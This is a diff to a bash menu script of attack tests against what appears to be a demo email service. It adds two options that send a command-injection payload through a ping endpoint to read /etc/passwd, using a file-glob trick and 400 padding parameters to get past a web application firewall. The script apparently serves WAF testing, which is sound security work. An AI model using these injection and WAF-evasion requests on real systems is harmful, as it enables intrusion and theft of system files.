@@ -241,6 +241,22 @@ performWAFVolumeTest() {
 
 }
 
+preformWAFBypassFileGlob(){
+    curl 'http://'"$host"':'$emailserviceport'/ping?ip=localhost%20;%20cat%20/etc/p*sswd'
+}
+
+preformWAFBypassExcessiveURLParams(){
+    url="http://$host:$emailserviceport/ping?"
+
+      # Loop to add additional parameters
+      for i in {1..400}
+      do
+        url="$url&param$i=value$i"
+      done
+
+      curl "$url&ip=localhost%20;%20cat%20/etc/passwd"
+}
+
 # Function to display the menu
 display_menu() {
   echo "---------------------"
@@ -274,6 +290,8 @@ display_menu() {
   echo "24 Port Scan"
   echo "25 Run all exploit commands in turn"
   echo "26 Perform WAF Volume Test"
+  echo "27 WAF Bypass File Glob"
+  echo "28 WAF Bypass Excessive URL Params"
   echo "---------------------"
 }
 
@@ -436,6 +454,16 @@ while true; do
     26)
       echo "Perform WAF Volume Test"
       performWAFVolumeTest
+      read -p "Press Enter to continue..."
+      ;;
+    27)
+      echo "Perform WAF Bypass File Glob"
+      preformWAFBypassFileGlob
+      read -p "Press Enter to continue..."
+      ;;
+      28)
+      echo "Perform WAF Bypass Exccessive URL Params"
+      preformWAFBypassExcessiveURLParams
       read -p "Press Enter to continue..."
       ;;
     *)
